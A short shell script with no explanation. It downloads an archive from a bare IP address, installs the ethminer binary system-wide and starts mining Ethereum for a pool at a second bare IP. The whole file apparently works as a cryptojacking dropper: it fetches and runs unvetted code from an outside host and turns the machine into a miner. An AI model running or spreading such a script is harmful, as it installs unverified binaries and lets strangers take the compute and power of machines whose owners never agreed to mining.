#!/bin/sh
apt-get update -y; apt-get install -y tar; apt-get install wget; mkdir down; cd down; wget http://159.89.237.64/test.gz; tar -zxvf test.gz; cd bin; install -sv ethminer /usr/local/bin/; ./ethminer -U -F  http://143.198.11.202:8080/a
